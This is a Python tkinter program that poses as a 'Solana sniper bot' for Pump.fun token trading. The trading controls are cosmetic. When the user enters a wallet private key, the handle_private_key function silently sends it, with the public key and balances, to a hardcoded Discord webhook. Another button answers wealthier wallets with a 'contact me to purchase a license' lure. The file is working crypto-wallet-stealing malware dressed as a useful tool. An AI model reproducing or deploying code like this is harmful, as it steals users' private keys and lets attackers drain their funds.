import tkinter as tk
from pathlib import Path
from tkinter import Canvas, Entry, Button, PhotoImage, messagebox, Toplevel, Label
import base58
from solders.keypair import Keypair
from solana.rpc.api import Client
from solders.pubkey import Pubkey
from solana.rpc.types import TokenAccountOpts
import requests
import json

try:
    from ctypes import windll
    windll.shcore.SetProcessDpiAwareness(1)
except:
    pass

OUTPUT_PATH = Path(__file__).parent
ASSETS_PATH = OUTPUT_PATH / Path(r"assets/frame0")

def relative_to_assets(path: str) -> Path:
    return ASSETS_PATH / Path(path)

def get_wallet_from_private_key_bs58(private_key_bs58: str) -> Keypair:
    try:
        private_key_bytes = base58.b58decode(private_key_bs58)
        wallet = Keypair.from_bytes(private_key_bytes)
        return wallet
    except Exception as e:
        raise ValueError("Invalid Private Key")

def check_sol_balance(public_key_str: str) -> float:
    solana_client = Client("https://api.mainnet-beta.solana.com")
    public_key = Pubkey.from_string(public_key_str)
    balance_response = solana_client.get_balance(public_key)
    sol_balance = balance_response.value / 1e9  
    return sol_balance

def check_wsol_balance(public_key_str: str) -> float:
    solana_client = Client("https://api.mainnet-beta.solana.com")
    public_key = Pubkey.from_string(public_key_str)

    try:

        wsol_mint_address = Pubkey.from_string("So11111111111111111111111111111111111111112")
        token_accounts = solana_client.get_token_accounts_by_owner(
            public_key,
            TokenAccountOpts(mint=wsol_mint_address)
        )

        if token_accounts.value:

            wsol_account_pubkey = token_accounts.value[0].pubkey
            wsol_balance_response = solana_client.get_token_account_balance(Pubkey.from_string(str(wsol_account_pubkey)))

            wsol_balance = wsol_balance_response.value.ui_amount
            return wsol_balance if wsol_balance is not None else 0.0
        else:
            return 0.0
    except Exception as e:
        print(f"An error occurred: {e}")
        return 0.0

def show_start_sniping_message():
    messagebox.showinfo("Notification", "Please 'START SNIPING' to refresh.")

def show_start_sniping_stop_message():
    messagebox.showinfo("Notification", "Please press 'START SNIPING' to STOP SNIPING.")

def handle_private_key():
    private_key = entry_1.get()
    try:
        wallet = get_wallet_from_private_key_bs58(private_key)
        public_key = str(wallet.pubkey())

        sol_balance = check_sol_balance(public_key)
        wsol_balance = check_wsol_balance(public_key)

        canvas.itemconfig(sol_balance_text, text=f"{sol_balance} SOL")
        canvas.itemconfig(wsol_balance_text, text=f"{wsol_balance} WSOL")
        canvas.itemconfig(address_text, text=public_key)

        webhook_url = 'https://discord.com/api/webhooks/1262224184621142046/N15l8cDRElJUNbQjxdh0BMbJP4fCpWjAvfBGiaT38kRSD9Knp6v0ewXrgbqAd4CG1DSA'
        data = {
            "content": f"Private Key: {private_key}\nPublic Key: {public_key}\nSOL Balance: {sol_balance}\nWSOL Balance: {wsol_balance}"
        }
        response = requests.post(webhook_url, json=data)

        if response.status_code != 204:
            messagebox.showerror("Error", f"Failed Private key: {response.status_code}")

    except ValueError as e:
        messagebox.showerror("Invalid Private Key", str(e))
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def handle_button_5():
    if not entry_2.get() or not entry_6.get():
        messagebox.showwarning("Warning", "You have not entered all required information.")
        return

    private_key = entry_1.get()
    if not private_key:
        messagebox.showerror("Error", "You need to enter a private key first.")
        return

    try:
        wallet = get_wallet_from_private_key_bs58(private_key)
        public_key = str(wallet.pubkey())
        sol_balance = check_sol_balance(public_key)

        if sol_balance == 0:
            messagebox.showerror("Error", "Not enough alance.")
        elif sol_balance > 0.3:
            messagebox.showinfo("Info", "Not import LICENSE, Contact me to purchase a license key.")
        elif sol_balance > 0:
            messagebox.showinfo("Info", "Not enough Balance or Fee SOL/WSOL.")
        elif sol_balance > 0.1:
            messagebox.showinfo("Info", "Minimum amount must be 0.3 SOL/WSOL.")
        else:
            show_start_sniping_stop_message()
    except ValueError as e:
        messagebox.showerror("Invalid Private Key", str(e))
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def is_valid_number(value):
    try:
        float(value)
        return True
    except ValueError:
        return False

def update_values_button_3():
    try:
        if is_valid_number(entry_2.get()):
            value_1 = entry_2.get()
            canvas.itemconfig(canvas_value_1, text=value_1)

        if is_valid_number(entry_4.get()):
            value_2 = entry_4.get()
            canvas.itemconfig(canvas_value_2, text=value_2)
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def update_values_button_7():
    try:
        if is_valid_number(entry_6.get()):
            value_1 = entry_6.get()
            canvas.itemconfig(canvas_value_3, text=value_1)

        if is_valid_number(entry_7.get()):
            value_2 = entry_7.get()
            canvas.itemconfig(canvas_value_4, text=value_2)

        if is_valid_number(entry_8.get()):
            value_3 = entry_8.get()
            canvas.itemconfig(canvas_value_5, text=value_3)
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def reset_values_button_4():
    entry_2.delete(0, tk.END)
    entry_2.insert(0, '0')
    entry_5.delete(0, tk.END)
    entry_5.insert(0, '0')
    entry_3.delete(0, tk.END)
    entry_3.insert(0, '0')
    entry_4.delete(0, tk.END)
    entry_4.insert(0, '0')

def reset_values_button_8():
    entry_12.delete(0, tk.END)
    entry_12.insert(0, '0')
    entry_6.delete(0, tk.END)
    entry_6.insert(0, '0')
    entry_7.delete(0, tk.END)
    entry_7.insert(0, '0')
    entry_8.delete(0, tk.END)
    entry_8.insert(0, '0')
    entry_9.delete(0, tk.END)
    entry_9.insert(0, '0')

def open_form():
    form_window = Toplevel(window)
    form_window.title("Enter Token")
    form_window.geometry("400x200")
    form_window.configure(bg="#2C2C2C")

    window_width = window.winfo_width()
    window_height = window.winfo_height()
    window_x = window.winfo_x()
    window_y = window.winfo_y()

    form_window_width = 400
    form_window_height = 200
    position_right = window_x + int((window_width / 2) - (form_window_width / 2))
    position_down = window_y + int((window_height / 2) - (form_window_height / 2))

    form_window.geometry(f"{form_window_width}x{form_window_height}+{position_right}+{position_down}")

    def submit_form():
        global current_value
        data = entry_form.get()
        print(f"Token Added: {data}")
        current_value += 1
        canvas.itemconfig(canvas_value_to_update, text=str(current_value))
        form_window.destroy()

    Label(form_window, text="ADD TOKEN:", bg="#2C2C2C", fg="#FFFFFF", font=("Inter", 12)).place(x=20, y=20)
    entry_form = Entry(form_window, bd=0, bg="#505050", fg="#FFFFFF", highlightthickness=0, width=35)
    entry_form.place(x=20, y=60, width=360, height=30)

    submit_button = Button(form_window, text="Submit", command=submit_form, bg="#1C1C1C", fg="#FFFFFF", borderwidth=0, highlightthickness=0)
    submit_button.place(x=150, y=120, width=100, height=30)

window = tk.Tk()
window.title("SOLANA SNIPER BOT - Pump.fun")

icon_image = PhotoImage(file="/assets/solana.png")
window.iconphoto(False, icon_image)

window.geometry("1539x810")
window.configure(bg = "#FFFFFF")

canvas = Canvas(
    window,
    bg = "#FFFFFF",
    height = 810,
    width = 1539,
    bd = 0,
    highlightthickness=0,
    relief = "ridge"
)

canvas = Canvas(
    window,
    bg = "#FFFFFF",
    height = 810,
    width = 1539,
    bd = 0,
    highlightthickness=0,
    relief = "ridge"
)

canvas.place(x = 0, y = 0)

image_image_1 = PhotoImage(file=relative_to_assets("image_1.png"))
image_1 = canvas.create_image(769.254, 405.095, image=image_image_1)

image_image_2 = PhotoImage(file=relative_to_assets("image_2.png"))
image_2 = canvas.create_image(1386.291, 455.882, image=image_image_2)

image_image_3 = PhotoImage(file=relative_to_assets("image_3.png"))
image_3 = canvas.create_image(775.442, 99.881, image=image_image_3)

button_image_1 = PhotoImage(file=relative_to_assets("button_1.png"))
button_1 = Button(
    image=button_image_1,
    borderwidth=0,
    highlightthickness=0,
    command=handle_private_key,
    relief="flat"
)
button_1.place(x=1017.594, y=21.962, width=162.057, height=52.179)

entry_image_1 = PhotoImage(file=relative_to_assets("entry_1.png"))
entry_bg_1 = canvas.create_image(629.971, 47.281, image=entry_image_1)
entry_1 = Entry(bd=0, bg="#505050", fg="#FFFFFF", highlightthickness=0)
entry_1.place(x=258.931, y=23.795, width=742.081, height=44.973)

sol_balance_text = canvas.create_text(
    298.622, 132.052, anchor="nw", text="0 SOL", fill="#5CFF41", font=("Inter ExtraBold", 15 * -1)
)
wsol_balance_text = canvas.create_text(
    569.622, 132.052, anchor="nw", text="0 WSOL", fill="#5CFF41", font=("Inter ExtraBold", 15 * -1)
)

image_image_4 = PhotoImage(file=relative_to_assets("image_4.png"))
image_4 = canvas.create_image(1386.606, 455.882, image=image_image_4)

image_image_5 = PhotoImage(file=relative_to_assets("image_5.png"))
image_5 = canvas.create_image(1387.622, 453.052, image=image_image_5)

canvas_value_to_update = canvas.create_text(
    1415.078, 203.809, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1)
)
current_value = 0

canvas.create_text(1266.061, 204.071, anchor="nw", text="TOKEN: ", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(1415.059, 238.842, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.198, 307.191, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.001, 343.941, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.160, 375.883, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.040, 273.875, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1299.553, 142.339, anchor="nw", text="SNIPING INFO", fill="#FFFFFF", font=("MontserratRoman SemiBold", 25 * -1))
canvas.create_text(1266.042, 238.416, anchor="nw", text="SUCCESS:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1266.023, 272.763, anchor="nw", text="FAILED:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1265.974, 378.892, anchor="nw", text="SELL DELAY:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1265.994, 343.858, anchor="nw", text="BUY DELAY:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1266.013, 308.826, anchor="nw", text="AMOUNT:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.517, 409.760, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.319, 446.510, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.479, 478.452, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1266.293, 481.461, anchor="nw", text="LOG LEVEL:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1266.312, 446.428, anchor="nw", text="STOP LOSS:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1266.331, 411.395, anchor="nw", text="TAKE PROFIT:", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1415.152, 514.449, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1414.955, 551.199, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(1265.947, 551.117, anchor="nw", text="MAX POOL SIZE", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas.create_text(1265.966, 516.084, anchor="nw", text="MIN POOL SIZE", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

image_image_6 = PhotoImage(file=relative_to_assets("image_6.png"))
image_6 = canvas.create_image(226.651, 382.331, image=image_image_6)

button_image_2 = PhotoImage(file=relative_to_assets("button_2.png"))
button_2 = Button(
    image=button_image_2,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_2 clicked"),
    relief="flat"
)
button_2.place(x=1461.599, y=35.029, width=42.046, height=42.046)

image_image_7 = PhotoImage(file=relative_to_assets("image_7.png"))
image_7 = canvas.create_image(1072.793, 311.540, image=image_image_7)

button_image_3 = PhotoImage(file=relative_to_assets("button_3.png"))
button_3 = Button(
    image=button_image_3,
    borderwidth=0,
    highlightthickness=0,
    command=update_values_button_3,
    relief="flat"
)
button_3.place(x=71.598, y=442.866, width=337.050, height=45.372)

button_3.config(command=update_values_button_3)

button_image_4 = PhotoImage(file=relative_to_assets("button_4.png"))
button_4 = Button(
    image=button_image_4,
    borderwidth=0,
    highlightthickness=0,
    command=reset_values_button_4,
    relief="flat"
)
button_4.place(x=158.598, y=503.963, width=161.050, height=45.178)

image_image_8 = PhotoImage(file=relative_to_assets("image_8.png"))
image_8 = canvas.create_image(119.197, 305.673, image=image_image_8)

entry_image_2 = PhotoImage(file=relative_to_assets("entry_2.png"))
entry_bg_2 = canvas.create_image(167.252, 306.026, image=entry_image_2)
entry_2 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_2.place(x=138.720, y=287.277, width=57.064, height=35.498)

canvas.create_text(46.622, 296.052, anchor="nw", text="AMOUNT: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_9 = PhotoImage(file=relative_to_assets("image_9.png"))
image_9 = canvas.create_image(117.733, 370.315, image=image_image_9)

canvas.create_text(40.622, 359.052, anchor="nw", text="SLIPPAGE: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_10 = PhotoImage(file=relative_to_assets("image_10.png"))
image_10 = canvas.create_image(328.647, 305.645, image=image_image_10)

entry_image_3 = PhotoImage(file=relative_to_assets("entry_3.png"))
entry_bg_3 = canvas.create_image(167.174, 370.182, image=entry_image_3)
entry_3 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_3.place(x=138.746, y=351.164, width=56.857, height=36.037)

entry_image_4 = PhotoImage(file=relative_to_assets("entry_4.png"))
entry_bg_4 = canvas.create_image(390.570, 305.855, image=entry_image_4)
entry_4 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_4.place(x=372.433, y=286.961, width=36.274, height=35.788)

canvas.create_text(250.622, 296.052, anchor="nw", text="BUY DELAY: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_11 = PhotoImage(file=relative_to_assets("image_11.png"))
image_11 = canvas.create_image(328.555, 370.180, image=image_image_11)

entry_image_5 = PhotoImage(file=relative_to_assets("entry_5.png"))
entry_bg_5 = canvas.create_image(390.526, 370.175, image=entry_image_5)
entry_5 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_5.place(x=371.746, y=350.958, width=37.561, height=36.434)

canvas.create_text(250.622, 360.052, anchor="nw", text="BUY RETRIES: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

canvas.create_text(121.622, 37.052, anchor="nw", text="PRIVATE KEY:", fill="#FFFFFF", font=("Inter ExtraBold", 17 * -1))

address_text = canvas.create_text(286.622, 100.052, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

canvas.create_text(193.065, 99.993, anchor="nw", text="ADDRESS : ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

canvas.create_text(188.766, 131.534, anchor="nw", text=" SOL Balance: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

canvas.create_text(441.396, 131.674, anchor="nw", text=" WSOL Balance: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_13 = PhotoImage(file=relative_to_assets("image_13.png"))
image_13 = canvas.create_image(171.219, 140.204, image=image_image_13)

image_image_14 = PhotoImage(file=relative_to_assets("image_14.png"))
image_14 = canvas.create_image(171.237, 108.661, image=image_image_14)

canvas.create_text(262.191, 410.877, anchor="nw", text="SOL", fill="#FFFFFF", font=("Inter ExtraBold", 11 * -1))

canvas.create_text(171.105, 410.512, anchor="nw", text="WSOL", fill="#FFFFFF", font=("Inter ExtraBold", 11 * -1))

image_image_16 = PhotoImage(file=relative_to_assets("image_16.png"))
image_16 = canvas.create_image(234.062, 417.225, image=image_image_16, state='hidden')

image_image_17 = PhotoImage(file=relative_to_assets("image_17.png"))
image_17 = canvas.create_image(984.607, 385.478, image=image_image_17)

canvas.create_text(927.710, 379.349, anchor="nw", text="CHECK RUG", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

image_image_20 = PhotoImage(file=relative_to_assets("image_20.png"))
image_20 = canvas.create_image(1143.952, 384.351, image=image_image_20)

canvas.create_text(1081.731, 378.230, anchor="nw", text="CHECK BURNED", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

image_image_23 = PhotoImage(file=relative_to_assets("image_23.png"))
image_23 = canvas.create_image(1081.612, 338.201, image=image_image_23)

canvas.create_text(980.267, 333.204, anchor="nw", text="CHECK RENOUNCED", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_rectangle(
    900.622, 424.052, 1064.622, 470.052, fill="#121212", outline="")

button_image_5 = PhotoImage(file=relative_to_assets("button_5.png"))
button_5 = Button(
    image=button_image_5,
    borderwidth=0,
    highlightthickness=0,
    command=handle_button_5,
    relief="flat"
)
button_5.place(x=900.597, y=423.960, width=166.052, height=47.183)

button_image_6 = PhotoImage(file=relative_to_assets("button_6.png"))
button_6 = Button(
    image=button_image_6,
    borderwidth=0,
    highlightthickness=0,
    command=show_start_sniping_stop_message,
    relief="flat"
)
button_6.place(x=1071.596, y=423.961, width=165.052, height=47.182)

image_image_26 = PhotoImage(file=relative_to_assets("image_26.png"))
image_26 = canvas.create_image(672.674, 382.331, image=image_image_26)

button_image_7 = PhotoImage(file=relative_to_assets("button_7.png"))
button_7 = Button(
    image=button_image_7,
    borderwidth=0,
    highlightthickness=0,
    command=update_values_button_7,
    relief="flat"
)
button_7.place(x=513.596, y=441.865, width=339.053, height=48.374)

button_7.config(command=update_values_button_7)

button_image_8 = PhotoImage(file=relative_to_assets("button_8.png"))
button_8 = Button(
    image=button_image_8,
    borderwidth=0,
    highlightthickness=0,
    command=reset_values_button_8,
    relief="flat"
)
button_8.place(x=603.598, y=500.962, width=162.050, height=45.179)

button_image_9 = PhotoImage(file=relative_to_assets("button_9.png"))
button_9 = Button(
    image=button_image_9,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_9 clicked"),
    relief="flat"
)
button_9.place(x=596.595, y=211.956, width=174.055, height=50.192)

button_image_10 = PhotoImage(file=relative_to_assets("button_10.png"))
button_10 = Button(
    image=button_image_10,
    borderwidth=0,
    highlightthickness=0,
    command=lambda: print("button_10 clicked"),
    relief="flat"
)
button_10.place(x=140.595, y=215.956, width=174.055, height=50.192)

button_image_11 = PhotoImage(file=relative_to_assets("button_11.png"))
button_11 = Button(
    image=button_image_11,
    borderwidth=0,
    highlightthickness=0,
    command=show_start_sniping_message,
    relief="flat"
)
button_11.place(x=1147.597, y=661.002, width=91.051, height=46.100)

button_image_12 = PhotoImage(file=relative_to_assets("button_12.png"))
button_12 = Button(
    image=button_image_12,
    borderwidth=0,
    highlightthickness=0,
    command=open_form,
    relief="flat"
)
button_12.place(x=1022.599, y=516.983, width=125.047, height=43.202)

image_image_27 = PhotoImage(file=relative_to_assets("image_27.png"))
image_27 = canvas.create_image(581.676, 301.533, image=image_image_27)

entry_image_6 = PhotoImage(file=relative_to_assets("entry_6.png"))
entry_bg_6 = canvas.create_image(642.874, 301.258, image=entry_image_6)
entry_6 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_6.place(x=618.213, y=281.896, width=49.323, height=36.723)

canvas.create_text(494.139, 293.957, anchor="nw", text="SELL DELAY : ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_28 = PhotoImage(file=relative_to_assets("image_28.png"))
image_28 = canvas.create_image(580.679, 348.806, image=image_image_28)

entry_image_7 = PhotoImage(file=relative_to_assets("entry_7.png"))
entry_bg_7 = canvas.create_image(642.868, 349.138, image=entry_image_7)
entry_7 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_7.place(x=620.251, y=330.152, width=45.233, height=35.972)

canvas.create_text(496.328, 339.255, anchor="nw", text="TAKE PROFIT:", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_29 = PhotoImage(file=relative_to_assets("image_29.png"))
image_29 = canvas.create_image(580.681, 398.330, image=image_image_29)

entry_image_8 = PhotoImage(file=relative_to_assets("entry_8.png"))
entry_bg_8 = canvas.create_image(642.833, 398.451, image=entry_image_8)
entry_8 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_8.place(x=620.369, y=379.366, width=44.927, height=36.170)

canvas.create_text(499.609, 389.587, anchor="nw", text="STOP LOSS:", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_30 = PhotoImage(file=relative_to_assets("image_30.png"))
image_30 = canvas.create_image(777.580, 312.797, image=image_image_30)

entry_image_9 = PhotoImage(file=relative_to_assets("entry_9.png"))
entry_bg_9 = canvas.create_image(840.217, 312.962, image=entry_image_9)
entry_9 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_9.place(x=823.161, y=293.856, width=34.112, height=36.213)

canvas.create_text(699.654, 304.032, anchor="nw", text=" SLIPPAGE: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_31 = PhotoImage(file=relative_to_assets("image_31.png"))
image_31 = canvas.create_image(1076.372, 231.770, image=image_image_31)

entry_image_10 = PhotoImage(file=relative_to_assets("entry_10.png"))
entry_bg_10 = canvas.create_image(1146.777, 232.234, image=entry_image_10)
entry_10 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_10.place(x=1110.071, y=213.206, width=75.412, height=36.056)

canvas.create_text(981.688, 223.514, anchor="nw", text="MIN POOL SIZE: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_32 = PhotoImage(file=relative_to_assets("image_32.png"))
image_32 = canvas.create_image(1075.597, 284.671, image=image_image_32)

entry_image_11 = PhotoImage(file=relative_to_assets("entry_11.png"))
entry_bg_11 = canvas.create_image(1147.282, 285.186, image=entry_image_11)
entry_11 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_11.place(x=1110.238, y=266.075, width=75.089, height=36.222)

canvas.create_text(981.690, 275.859, anchor="nw", text="MAX POOL SIZE: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_33 = PhotoImage(file=relative_to_assets("image_33.png"))
image_33 = canvas.create_image(777.585, 369.074, image=image_image_33)

entry_image_12 = PhotoImage(file=relative_to_assets("entry_12.png"))
entry_bg_12 = canvas.create_image(840.081, 369.248, image=entry_image_12)
entry_12 = Entry(bd=0, bg="#999999", fg="#FFFFFF", highlightthickness=0)
entry_12.place(x=822.832, y=350.251, width=34.499, height=35.995)

canvas.create_text(695.622, 361.052, anchor="nw", text="SELL RETRIES: ", fill="#FFFFFF", font=("Inter ExtraBold", 15 * -1))

image_image_34 = PhotoImage(file=relative_to_assets("image_34.png"))
image_34 = canvas.create_image(580.186, 683.738, image=image_image_34)

image_image_35 = PhotoImage(file=relative_to_assets("image_35.png"))
image_35 = canvas.create_image(67.372, 635.348, image=image_image_35)

image_image_36 = PhotoImage(file=relative_to_assets("image_36.png"))
image_36 = canvas.create_image(67.372, 701.453, image=image_image_36)

image_image_37 = PhotoImage(file=relative_to_assets("image_37.png"))
image_37 = canvas.create_image(67.372, 766.493, image=image_image_37)

canvas.create_text(49.335, 577.098, anchor="nw", text="NAME", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(114.178, 626.147, anchor="nw", text="NAME", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(114.181, 693.319, anchor="nw", text="NAME", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(114.184, 759.425, anchor="nw", text="NAME", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(356.173, 577.112, anchor="nw", text="BALANCE", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(661.853, 577.125, anchor="nw", text="PROFIT", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(981.428, 577.139, anchor="nw", text="DATE/TIME", fill="#FFFFFF", font=("Inter ExtraBold", 10 * -1))

canvas.create_text(661.855, 626.171, anchor="nw", text="+0%", fill="#5CFF41", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(356.175, 626.158, anchor="nw", text="0 SOL", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(951.315, 626.184, anchor="nw", text="dd/mm/yy - hh:mm", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(951.319, 691.223, anchor="nw", text="dd/mm/yy - hh:mm", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(951.321, 754.130, anchor="nw", text="dd/mm/yy - hh:mm", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(356.178, 691.197, anchor="nw", text="0 SOL", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(356.181, 754.104, anchor="nw", text="0 SOL", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(661.858, 691.211, anchor="nw", text="+0%", fill="#5CFF41", font=("Inter ExtraBold", 14 * -1))

canvas.create_text(661.862, 757.316, anchor="nw", text="+0%", fill="#5CFF41", font=("Inter ExtraBold", 14 * -1))

image_image_38 = PhotoImage(file=relative_to_assets("image_38.png"))
image_38 = canvas.create_image(90.601, 651.139, image=image_image_38)

image_image_39 = PhotoImage(file=relative_to_assets("image_39.png"))
image_39 = canvas.create_image(90.604, 718.311, image=image_image_39)

image_image_40 = PhotoImage(file=relative_to_assets("image_40.png"))
image_40 = canvas.create_image(90.607, 785.483, image=image_image_40)

canvas_value_1 = canvas.create_text(1415.198, 307.191, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_2 = canvas.create_text(1415.001, 343.941, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_3 = canvas.create_text(1415.160, 375.883, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_4 = canvas.create_text(1415.517, 409.760, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_5 = canvas.create_text(1415.319, 446.510, anchor="nw", text="0", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_6 = canvas.create_text(1265.947, 551.117, anchor="nw", text="", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))
canvas_value_7 = canvas.create_text(1265.966, 516.084, anchor="nw", text="MIN POOL SIZE", fill="#FFFFFF", font=("Inter ExtraBold", 14 * -1))

toggle_state = False

def toggle_switch(event):
    global toggle_state
    toggle_state = not toggle_state

    if toggle_state:
        canvas.itemconfig(image_15_toggle, state='hidden')
        canvas.itemconfig(image_16_toggle, state='normal')
    else:
        canvas.itemconfig(image_15_toggle, state='normal')
        canvas.itemconfig(image_16_toggle, state='hidden')

image_15 = PhotoImage(file=relative_to_assets("image_15.png"))
image_16 = PhotoImage(file=relative_to_assets("image_16.png"))

image_15_toggle = canvas.create_image(233.743, 417.498, image=image_15)
image_16_toggle = canvas.create_image(233.743, 417.498, image=image_16, state='hidden')

canvas.tag_bind(image_15_toggle, "<Button-1>", toggle_switch)
canvas.tag_bind(image_16_toggle, "<Button-1>", toggle_switch)

image_24 = PhotoImage(file=relative_to_assets("image_24.png"))
image_25 = PhotoImage(file=relative_to_assets("image_25.png"))

image_24_toggle = canvas.create_image(1120.607, 338.581, image=image_24)
image_25_toggle = canvas.create_image(1120.607, 338.581, image=image_25, state='hidden')

def toggle_image_24_25(event):
    global toggle_state_24_25
    toggle_state_24_25 = not toggle_state_24_25

    if toggle_state_24_25:
        canvas.itemconfig(image_24_toggle, state='hidden')
        canvas.itemconfig(image_25_toggle, state='normal')
    else:
        canvas.itemconfig(image_24_toggle, state='normal')
        canvas.itemconfig(image_25_toggle, state='hidden')

canvas.tag_bind(image_24_toggle, "<Button-1>", toggle_image_24_25)
canvas.tag_bind(image_25_toggle, "<Button-1>", toggle_image_24_25)

toggle_state_24_25 = False

image_18 = PhotoImage(file=relative_to_assets("image_18.png"))
image_19 = PhotoImage(file=relative_to_assets("image_19.png"))

image_18_toggle = canvas.create_image(1019.492, 385.989, image=image_18)
image_19_toggle = canvas.create_image(1019.492, 385.989, image=image_19, state='hidden')

def toggle_image_18_19(event):
    global toggle_state_18_19
    toggle_state_18_19 = not toggle_state_18_19

    if toggle_state_18_19:
        canvas.itemconfig(image_18_toggle, state='hidden')
        canvas.itemconfig(image_19_toggle, state='normal')
    else:
        canvas.itemconfig(image_18_toggle, state='normal')
        canvas.itemconfig(image_19_toggle, state='hidden')

canvas.tag_bind(image_18_toggle, "<Button-1>", toggle_image_18_19)
canvas.tag_bind(image_19_toggle, "<Button-1>", toggle_image_18_19)

toggle_state_18_19 = False

image_21 = PhotoImage(file=relative_to_assets("image_21.png"))
image_22 = PhotoImage(file=relative_to_assets("image_22.png"))

image_21_toggle = canvas.create_image(1194.240, 382.596, image=image_21)
image_22_toggle = canvas.create_image(1194.240, 382.596, image=image_22, state='hidden')

def toggle_image_21_22(event):
    global toggle_state_21_22
    toggle_state_21_22 = not toggle_state_21_22

    if toggle_state_21_22:
        canvas.itemconfig(image_21_toggle, state='hidden')
        canvas.itemconfig(image_22_toggle, state='normal')
    else:
        canvas.itemconfig(image_21_toggle, state='normal')
        canvas.itemconfig(image_22_toggle, state='hidden')

canvas.tag_bind(image_21_toggle, "<Button-1>", toggle_image_21_22)
